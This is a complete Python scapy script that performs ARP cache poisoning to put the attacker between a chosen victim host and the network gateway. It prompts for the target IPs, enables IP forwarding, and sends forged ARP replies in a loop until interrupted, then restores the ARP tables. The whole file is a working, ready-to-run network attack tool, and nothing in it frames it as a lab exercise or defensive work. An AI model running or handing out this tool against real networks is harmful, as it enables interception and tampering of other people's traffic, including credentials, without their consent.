from scapy.all import *
import sys
import os
import time

#Input interface and IP addresses of client and server
try:
	interface = raw_input("[*] Enter Desired Interface: ")
	victimIP = raw_input("[*] Enter Victim IP: ")
	gatewayIP = raw_input("[*] Enter Router IP: ")
except KeyboardInterrupt:
	print "\n[*] User Requested Shutdown"
	print "[*] Exiting..."
	sys.exit(1)

print "\n[*] Enabling IP Forwarding...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

#Get MAC Address
def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")
#ARP Spoofing
def reARP():
	
	print "\n[*] Restoring Targets..."
	victimMAC = get_mac(victimIP)
	gatewayMAC = get_mac(gatewayIP)
	send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
	print "[*] Disabling IP Forwarding..."
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print "[*] Shutting Down..."
	sys.exit(1)

def trick(gm, vm):
	send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
	send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))

#Man in the Middle attack
def manitm():
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		
		print "[!] Couldn't Find Victim MAC Address"
		print "[!] Exiting..."
		sys.exit(1)
	try:
		gatewayMAC = get_mac(gatewayIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		
		print "[!] Couldn't Find Gateway MAC Address"
		print "[!] Exiting..."
		sys.exit(1)
	print "[*] Poisoning Targets..."	
	while 1:
		try:
			trick(gatewayMAC, victimMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reARP()
			break
manitm()
